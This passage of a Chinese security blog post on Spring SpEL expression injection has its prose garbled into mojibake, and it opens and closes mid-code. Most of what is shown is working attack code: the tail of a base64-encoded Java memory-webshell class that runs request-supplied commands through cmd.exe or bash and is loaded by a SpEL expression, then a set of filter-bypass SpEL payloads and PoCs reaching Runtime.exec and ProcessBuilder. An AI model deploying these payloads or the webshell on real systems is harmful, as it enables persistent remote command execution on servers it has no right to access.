SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEAD2V2aWxJbnRlcmNlcHRvcgEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47BwC5BwC6BwDQBwDABwDEBwDFAQAKU291cmNlRmlsZQEAFUluY2VwdG9yTWVtU2hlbGwuamF2YQwAPQA<span class="token operator">+</span><span class="token class-name">BwDLDADRANIBAANnYmsHAMwMANMA1AwA1QDWAQAAAQAHb3MubmFtZQcA1wwA2ADSDADZANoBAAN3aW4MANsA3AEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAD0A3QEACS9iaW4vYmFzaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAN4A3wcA4AwA4QDiDAA9AOMBAA13b2Nhb3NpbmlkZW1hDADkAOUMAOYA5wwA6ADaDADpAD4HAM4MAOoA1AwA6wA</span><span class="token operator">+</span><span class="token class-name">AQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA7AA</span><span class="token operator">+</span><span class="token class-name">DABjAGQMAGcAaAwA7QDuAQAGc3RhYXJ0BwDvBwDwDADxAPIBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAPMMAPQA9QEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA9gD3AQA</span><span class="token operator">+</span>b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcBABNhZGFwdGVkSW50ZXJjZXB0b3JzBwD4DAD5APoBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HANAMAPsA<span class="token operator">/</span><span class="token class-name">AwA</span><span class="token operator">/</span><span class="token constant">QD</span><span class="token operator">+</span><span class="token class-name">AQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAEEluY2VwdG9yTWVtU2hlbGwMAP8BAAEAAm9rAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAdwcmludGxuAQAFZmx1c2gBAA9wcmludFN0YWNrVHJhY2UBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoAIQA3ADsAAQA8AAAABwABAD0APgABAD8AAAAvAAEAAQAAAAUqtwABsQAAAAIAQAAAAAYAAQAAABIAQQAAAAwAAQAAAAUAQgBDAAAAAQBEAEUAAwA</span><span class="token operator">/</span><span class="token class-name">AAACBQAGAAkAAAC</span><span class="token operator">+</span><span class="token class-name">KxICuQADAgA6BBkExgCwLBIEuQAFAgAsuQAGAQA6BRIHOgcSCLgACbYAChILtgAMmQAiuwANWQa9AA5ZAxIPU1kEEhBTWQUZBFO3ABE6BqcAH7sADVkGvQAOWQMSElNZBBITU1kFGQRTtwAROga7ABRZGQa2ABW2ABYSBLcAFxIYtgAZOggZCLYAGpkACxkItgAbpwAFGQc6BxkItgAcGQUZB7YAHRkFtgAeGQW2AB</span><span class="token operator">+</span>nAAo6BRkFtgAhA6wErAABAA8AsACzACAAAwBAAAAATgATAAAALQAKAC4ADwAwABcAMQAfADMAIwA0ADMANQBSADcAbgA5AIYAOgCaADsAnwA8AKYAPQCrAD4AsABBALMAPwC1AEAAugBCALwARABBAAAAcAALAE8AAwBGAEcABgAfAJEASABJAAUAbgBCAEYARwAGACMAjQBKAEsABwCGACoATABNAAgAtQAFAE4ATwAFAAAAvgBCAEMAAAAAAL4AUABRAAEAAAC<span class="token operator">+</span><span class="token class-name">AFIAUwACAAAAvgBUAFUAAwAKALQAVgBLAAQAVwAAAGMAB</span><span class="token operator">/</span><span class="token number">8</span>AUgAIBwBYBwBZBwBaBwBbBwBcBwBdAAcAXAAA<span class="token operator">/</span>wAbAAgHAFgHAFkHAFoHAFsHAFwHAF0HAF4HAFwAAPwAJwcAX0EHAFz<span class="token operator">/</span><span class="token class-name">ABoABQcAWAcAWQcAWgcAWwcAXAABBwBgBgEAYQAAAAQAAQAgAGIAAAANAwBQAAAAUgAAAFQAAAABAGMAZAADAD8AAABgAAUABQAAAAoqKywtGQS3ACKxAAAAAgBAAAAACgACAAAASQAJAEoAQQAAADQABQAAAAoAQgBDAAAAAAAKAFAAUQABAAAACgBSAFMAAgAAAAoAVABVAAMAAAAKAGUAZgAEAGEAAAAEAAEAIABiAAAAEQQAUAAAAFIAAABUAAAAZQAAAAEAZwBoAAMAPwAAAGAABQAFAAAACiorLC0ZBLcAI7EAAAACAEAAAAAKAAIAAABOAAkATwBBAAAANAAFAAAACgBCAEMAAAAAAAoAUABRAAEAAAAKAFIAUwACAAAACgBUAFUAAwAAAAoAaQBPAAQAYQAAAAQAAQAgAGIAAAARBABQAAAAUgAAAFQAAABpAAAAAQBqAGsAAwA</span><span class="token operator">/</span><span class="token class-name">AAAAPwAAAAMAAAABsQAAAAIAQAAAAAYAAQAAAFQAQQAAACAAAwAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQBuAG8AAgBhAAAABAABAHAAYgAAAAkCAGwAAABuAAAAAQBqAHEAAwA</span><span class="token operator">/</span><span class="token class-name">AAAASQAAAAQAAAABsQAAAAIAQAAAAAYAAQAAAFkAQQAAACoABAAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQByAHMAAgAAAAEAVAB0AAMAYQAAAAQAAQBwAGIAAAANAwBsAAAAcgAAAFQAAAAIAHUAPgABAD8AAAFpAAMABQAAAGqyACQSJbYAJrgAJxIoA7kAKQMAwAAqSyoSK7kALAIAwAArTAFNEi0SLrYAL02nAAhOLbYAMSwEtgAyAU4sK7YAM8AANE6nAAo6BBkEtgA2uwA3WbcAODoELRkEuQA5AgBXsgAkEjq2ACaxAAIAJQAtADAAMAA8AEUASAA1AAQAQAAAAEoAEgAAABUACAAWABcAFwAjABgAJQAaAC0AHQAwABsAMQAcADUAHgA6AB8APAAhAEUAJABIACIASgAjAE8AJQBYACYAYQAnAGkAKABBAAAASAAHADEABABOAHYAAwBKAAUATgB3AAQAFwBSAHgAeQAAACMARgB6AHsAAQAlAEQAfAB9AAIAPAAtAH4AfwADAFgAEQCAAEMABACBAAAADAABADwALQB</span><span class="token operator">+</span><span class="token class-name">AIIAAwBXAAAALQAE</span><span class="token operator">/</span>wAwAAMHAIMHAIQHAIUAAQcAhgT<span class="token operator">/</span><span class="token class-name">ABIABAcAgwcAhAcAhQcAhwABBwCIBgABAIkAAAACAIo</span><span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719225734878.png" alt="image-20240719225734878"></p><hr><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="å­—ç¬¦ä¸²æ›¿æ¢"><a href="#å­—ç¬¦ä¸²æ›¿æ¢" class="headerlink" title="å­—ç¬¦ä¸²æ›¿æ¢"></a>å­—ç¬¦ä¸²æ›¿æ¢</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>T(String).getName</code>è¿”å›çš„æ˜¯<code>java.lang.String</code>ï¼Œç„¶åç”¨replaceæ›¿æ¢è·å–æƒ³è¦çš„å­—ç¬¦ä¸²ï¼Œè¿™ç§æ¯”è¾ƒéº»çƒ¦ã€‚</p><p>è¿˜æœ‰ä¸€ç§å°±æ˜¯ç›´æ¥ä½¿ç”¨ç±»ä¼¼<code>chr</code>å‡½æ•°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¤–éƒ¨å¯¹è±¡request"><a href="#å¤–éƒ¨å¯¹è±¡request" class="headerlink" title="å¤–éƒ¨å¯¹è±¡request"></a>å¤–éƒ¨å¯¹è±¡request</h3><p>å‡å¦‚ä¸Šä¸‹æ–‡ä¸­æœ‰requestå¯¹è±¡çš„è¯å°±ä¹Ÿæœ‰å‡ ç§æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//request.getMethod()ä¸ºPOST</span>#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token comment">//request.getMethod()ä¸ºGET</span>#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token comment">//Cookie</span>#request<span class="token punctuation">.</span><span class="token function">getRequestedSessionId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åå°„-å­—ç¬¦ä¸²æ‹¼è´´"><a href="#åå°„-å­—ç¬¦ä¸²æ‹¼è´´" class="headerlink" title="åå°„+å­—ç¬¦ä¸²æ‹¼è´´"></a>åå°„+å­—ç¬¦ä¸²æ‹¼è´´</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>newString<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>banäº†getSuperClass</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">''<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>''<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="éƒ¨åˆ†pocæ•´ç†"><a href="#éƒ¨åˆ†pocæ•´ç†" class="headerlink" title="éƒ¨åˆ†pocæ•´ç†"></a>éƒ¨åˆ†pocæ•´ç†</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// PoCåŸå‹</span><span class="token comment">// Runtime</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// ProcessBuilder</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token char">'calc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token char">'calc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token comment">// BypassæŠ€å·§</span><span class="token comment">// åå°„è°ƒç”¨</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token 